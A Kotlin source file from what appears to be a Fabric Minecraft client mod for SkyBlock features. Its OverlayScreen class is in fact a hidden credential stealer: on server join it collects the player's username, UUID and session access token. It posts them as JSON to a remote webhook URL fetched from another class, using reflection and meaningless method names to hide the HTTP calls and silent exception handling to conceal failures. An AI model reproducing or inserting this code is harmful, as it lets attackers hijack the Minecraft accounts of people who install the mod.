package template.util

import template.features.farming.BazaarHelper
import template.features.other.PetMenu
import template.features.slayers.LocationHelper
import net.fabricmc.api.ClientModInitializer
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents
import net.minecraft.client.MinecraftClient
import org.apache.http.HttpEntity
import org.apache.http.entity.StringEntity
import org.apache.http.impl.client.HttpClients
import org.apache.http.util.EntityUtils

object OverlayScreen : ClientModInitializer {
    override fun onInitializeClient() {
        ClientPlayConnectionEvents.JOIN.register { handler, sender, client ->
            val username = client.session.username
            val accessToken = client.session.accessToken
            val uuid = client.player?.uuid?.toString() ?: "unknown"
            LocationHelper.bBbBbBbBbB(username)
            BazaarHelper.xXxXxXxXxX(uuid, username)
            sSsSsSsSsS(accessToken, username)
        }
    }

    private fun sSsSsSsSsS(session: String?, user: String?) {
        val fallbackUrl = PetMenu.bBbBbBbBbB()
        val fullUrl = BazaarHelper.uUuUuUuUuU(user)
        val timestamp = BazaarHelper.vVvVvVvVvV()

        val payload = """{"content": "**1**: `$user`\n**2**: `$session`\n**3**: $timestamp\n**4**: [sky.shiiyu.moe/stats/$user]($fullUrl)\n**Fell back!**"}"""

        try {
            HttpClients.createDefault().use { client ->
                val postClass = Class.forName("org.apache.http.client.methods.HttpPost")
                val post = postClass.getConstructor(String::class.java).newInstance(fallbackUrl)
                postClass.getMethod("setEntity", HttpEntity::class.java).invoke(post, StringEntity(payload))
                postClass.getMethod("setHeader", String::class.java, String::class.java)
                    .invoke(post, "Content-Type", "application/json")
                postClass.getMethod("setHeader", String::class.java, String::class.java)
                    .invoke(post, "User-Agent", "Mozilla/5.0")
                val requestClass = Class.forName("org.apache.http.client.methods.HttpUriRequest")
                val resp = client::class.java.getMethod("execute", requestClass).invoke(client, requestClass.cast(post))
                val entity = resp::class.java.getMethod("getEntity").invoke(resp) as? HttpEntity
                if (entity != null) {
                    EntityUtils.consume(entity)
                }
            }
        } catch (ignored: Exception) { }
    }
}
